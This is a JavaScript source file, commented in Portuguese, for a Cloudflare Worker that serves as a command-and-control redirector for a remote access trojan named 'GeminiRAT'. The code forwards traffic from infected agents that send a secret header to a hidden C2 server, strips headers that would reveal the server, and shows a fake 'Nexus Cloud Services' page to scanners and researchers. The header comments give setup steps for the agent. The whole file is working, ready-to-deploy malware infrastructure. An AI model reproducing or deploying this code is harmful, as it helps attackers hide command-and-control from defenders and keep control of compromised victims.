/**
 * GeminiRAT C2 — Cloudflare Worker Redirector
 *
 * OPSEC: Este worker age como camada de indireção entre o agente e o C2 real.
 * Scanners, researchers e ferramentas de threat intel veem apenas uma página
 * genérica. Apenas requisições legítimas do agente (validadas por header e path)
 * são encaminhadas ao servidor C2 real.
 *
 * Como funciona:
 *   1. Toda requisição chega ao Worker (domínio público, ex: cdn.exemplo.com)
 *   2. Se o path e o header secreto batem → proxy transparente para C2_ORIGIN
 *   3. Qualquer outra coisa → página HTML genérica (parece site normal)
 *
 * Defesa em profundidade (BlueTeam / T1090.002):
 *   - O IP real do C2 nunca aparece em DNS público
 *   - Cloudflare absorve DDoS e scans automaticamente
 *   - O header secreto é um segundo fator além do HMAC do agente
 *
 * Configuração (variáveis de ambiente no painel Cloudflare / wrangler.toml):
 *   C2_ORIGIN      : URL base do seu C2, ex: https://1.2.3.4:5000
 *   REDIRECT_SECRET: string secreta compartilhada com o agente
 *
 * Ajuste no agent.py:
 *   Em initialize_globals(), adicione ao HTTP_HEADERS:
 *     'X-Cdn-Token': '<valor de REDIRECT_SECRET>'
 */

// ── Paths que o agente usa no C2 ─────────────────────────────────────────────
const AGENT_PATHS = [
  '/register',
  '/get_task/',
  '/task_result',
  '/register_mobile',
  '/get_task_mobile',
  '/task_result_mobile',
];

// ── Página de cobertura (parece um site de empresa genérico) ─────────────────
const DECOY_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nexus Cloud Services</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:system-ui,sans-serif;background:#f8fafc;color:#1e293b}
    header{background:#1e293b;color:#fff;padding:1rem 2rem;display:flex;align-items:center;gap:1rem}
    header h1{font-size:1.1rem;font-weight:600;letter-spacing:.5px}
    main{max-width:700px;margin:5rem auto;padding:2rem;text-align:center}
    h2{font-size:1.8rem;margin-bottom:1rem;color:#0f172a}
    p{color:#64748b;line-height:1.7;margin-bottom:.8rem}
    .badge{display:inline-block;background:#e2e8f0;border-radius:4px;padding:.2rem .7rem;font-size:.75rem;color:#475569;margin-top:1rem}
  </style>
</head>
<body>
  <header>
    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <path d="M3 15a4 4 0 004 4h9a5 5 0 10-.1-9.999 5.002 5.002 0 10-9.78 2.096A4.001 4.001 0 003 15z"/>
    </svg>
    <h1>Nexus Cloud Services</h1>
  </header>
  <main>
    <h2>Infrastructure & CDN Solutions</h2>
    <p>Enterprise-grade content delivery and cloud infrastructure for modern businesses.</p>
    <p>Our global network ensures low-latency connectivity across 200+ edge locations worldwide.</p>
    <span class="badge">Status: Operational</span>
  </main>
</body>
</html>`;

// ── Lógica principal ──────────────────────────────────────────────────────────
export default {
  async fetch(request, env) {
    const url      = new URL(request.url);
    const path     = url.pathname;
    const secret   = env.REDIRECT_SECRET || '';
    const c2Origin = (env.C2_ORIGIN || '').replace(/\/$/, '');

    // 1. Verifica se o path é um endpoint do agente
    const isAgentPath = AGENT_PATHS.some(p => path === p || path.startsWith(p));

    // 2. Verifica o header secreto (segundo fator além do HMAC do agente)
    const tokenHeader = request.headers.get('X-Cdn-Token') || '';
    const tokenValid  = secret.length > 0 && tokenHeader === secret;

    // DEBUG — visível via: wrangler tail --format pretty
    console.log('[GeminiRAT-Worker] path=' + path
      + ' isAgentPath=' + isAgentPath
      + ' tokenHeader="' + tokenHeader + '"'
      + ' secretLen=' + secret.length
      + ' tokenValid=' + tokenValid
      + ' c2Origin=' + c2Origin);

    // 3. Só faz proxy se AMBAS as condições forem verdadeiras
    if (isAgentPath && tokenValid && c2Origin) {
      return proxyToC2(request, url, c2Origin);
    }

    // Qualquer outra coisa: retorna decoy
    return new Response(DECOY_HTML, {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  },
};

/**
 * Encaminha a requisição para o C2 real, preservando método, headers e body.
 * Remove headers que poderiam revelar que veio pelo Worker.
 */
async function proxyToC2(request, url, c2Origin) {
  const targetUrl = c2Origin + url.pathname + url.search;

  // Lê o body como ArrayBuffer para garantir que bytes binários (AES)
  // sejam forwarded intactos — ReadableStream pode ser corrompido em trânsito.
  const hasBody = request.method !== 'GET' && request.method !== 'HEAD';
  const bodyBuffer = hasBody ? await request.arrayBuffer() : null;

  // Copia headers, removendo os que revelariam o Worker ou o domínio fronting
  const proxyHeaders = new Headers(request.headers);
  proxyHeaders.delete('X-Cdn-Token');          // não vaza o segredo pro C2
  proxyHeaders.delete('cf-connecting-ip');      // não expõe o IP real ao C2 log
  proxyHeaders.set('X-Forwarded-Host', url.hostname);
  // Garante que o Content-Length bate com o body real
  if (bodyBuffer !== null) {
    proxyHeaders.set('Content-Length', bodyBuffer.byteLength.toString());
  }

  const proxyReq = new Request(targetUrl, {
    method:  request.method,
    headers: proxyHeaders,
    body:    bodyBuffer,
  });

  try {
    console.log('[GeminiRAT-Worker] proxyToC2 -> ' + targetUrl + ' method=' + request.method);
    const resp = await fetch(proxyReq);
    console.log('[GeminiRAT-Worker] c2 responded status=' + resp.status);
    // Copia a resposta, removendo headers que revelariam o C2
    const respHeaders = new Headers(resp.headers);
    respHeaders.delete('server');
    respHeaders.delete('x-powered-by');
    return new Response(resp.body, {
      status:  resp.status,
      headers: respHeaders,
    });
  } catch (err) {
    // Em caso de falha de rede, retorna decoy em vez de erro revelador
    console.log('[GeminiRAT-Worker] fetch error: ' + err);
    return new Response(DECOY_HTML, {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  }
}
